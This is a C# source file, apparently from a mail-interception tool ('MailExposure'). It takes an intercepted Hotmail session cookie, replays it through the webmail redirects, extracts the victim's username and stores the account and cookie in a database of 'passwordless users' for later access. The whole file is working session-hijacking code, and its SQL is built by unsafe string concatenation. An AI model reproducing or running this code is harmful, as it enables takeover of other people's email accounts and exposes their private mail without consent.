using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Threading;
using System.IO;

namespace MailExposure.PopMailRC
{
    class FilterHotmail:displace
    {
        // Fields
        private string urls;
        private int userIndex;
        private string UserName;

        // Methods
        public FilterHotmail(string url, string strCookie, string interceptTime)
        {
            this.urls = "";
            this.UserName = "";
            base.url = url;
            base.cookie = strCookie;
            base.strCookie = strCookie;
            base.interceptTime = interceptTime;

        }
        public void loginUser()
        {
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request(base.url);
            string message = base.MyStringBuilder.ToString();
            if (message.IndexOf("Object moved") >= 0)
            {
                string str2 = base.putstr(message.ToString(), "href=\"/mail/", "\"", 0);
                if (str2 != "-1")
                {
                    str2 = str2.Replace("&amp;", "&");
                    base.url = base.Host + str2;
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    base.streamControl = true;
                    base.MyStringBuilder = this.Request(base.url);
                    message = base.MyStringBuilder.ToString();
                    int index = message.IndexOf("name=\"main\"");
                    if (index >= 0)
                    {
                        string str3 = base.putstr(message, "src=\"", "\"", index);
                        if (str3 != "-1")
                        {
                            base.url = base.Host + str3;
                            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                            base.streamControl = true;
                            base.MyStringBuilder = this.Request(base.url);
                            if (base.MyStringBuilder.ToString().IndexOf("class=\"ManageLink\"") < 0)
                            {
                                base.url = base.Host + "SwitchClassicVersion.aspx";
                                base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                                base.streamControl = true;
                                base.MyStringBuilder = this.Request(base.url);
                                if (base.MyStringBuilder.ToString().IndexOf("Object moved") >= 0)
                                {
                                    str2 = base.putstr(base.MyStringBuilder.ToString(), "href=\"/mail/", "\"", 0).Replace("&amp;", "&");
                                    base.url = base.Host + str2;
                                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                                    base.streamControl = true;
                                    base.MyStringBuilder = this.Request(base.url);
                                    message = base.MyStringBuilder.ToString();
                                }
                            }
                        }
                    }
                }
            }
            this.userIndex = message.IndexOf("id=\"uxp_hdr_meLink\"");
            if (this.userIndex != -1)
            {
                this.UserName = base.putstr(message, "title=\"", "@hotmail.com", this.userIndex);
                if (this.UserName == "-1")
                {
                    GlobalValue.PopMainForm.listBoxView.Items.Add("取用户名失败！");
                    GlobalValue.PopMainForm.listBoxView.SelectedIndex = GlobalValue.PopMainForm.listBoxView.Items.Count - 1;
                }
                else if ((this.UserName != "") && (this.UserName != null))
                {
                    if (this.urls == "")
                    {
                        this.urls = base.url;
                    }
                    string str4 = "'" + this.UserName + "'";
                    string str5 = "'" + base.strCookie + "'";
                    string str6 = "'capH'";
                    string str7 = "'H'";
                    string str8 = "'" + base.interceptTime + "'";
                    string str9 = "'无密用户'";
                    string str10 = "'是'";
                    string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收) values(" + str6 + "," + str4 + "," + str7 + "," + str7 + "," + str6 + ",'" + this.urls + "'," + str5 + "," + str8 + "," + str9 + "," + str10 + ")";
                    string str12 = "select count(*)from users where 服务器地址=" + str7 + "and 用户名=" + str4 + "and 用户类型=" + str9;
                    string str13 = "update users set 邮件地址='" + this.urls + "',验证登陆=" + str5 + ",时间限制=" + str8;
                    if (Convert.ToInt32(GlobalValue.PopMainForm.ExecuteSQL(str12)) > 0)
                    {
                        str12 = "select 时间限制 from users where 服务器地址=" + str7 + "and 用户名=" + str4 + "and 用户类型=" + str9;
                        DateTime time = DateTime.Parse(GlobalValue.PopMainForm.ExecuteSQL(str12));
                        if (DateTime.Compare(DateTime.Parse(base.interceptTime), time) > 0)
                        {
                            GlobalValue.PopMainForm.ExecuteSQL(str13);
                            GlobalValue.PopMainForm.listBoxView.Items.Add("[" + this.UserName + "]：修改用户！");
                        }
                    }
                    else
                    {
                        GlobalValue.PopMainForm.ExecuteSQL(strSql);
                        GlobalValue.PopMainForm.listBoxView.Items.Add("[MISS]：添加用户：" + this.UserName);
                    }
                }
            }

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Accept = "*/*";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        string str2 = base.putstr(this.urls, "http:", "/mail/", 0);
                        if ((str2 != "-1") && (base.Host == null))
                        {
                            base.Host = "http:" + str2 + "/mail/";
                        }
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str3 = reader.ReadLine(); str3 != null; str3 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str3 + "\r\n");
                        str3 = null;
                    }
                    base.streamControl = false;
                }
                reader.Close();
            }
            catch (Exception)
            {
            }
            return base.MyStringBuilder;

        }

    }
}
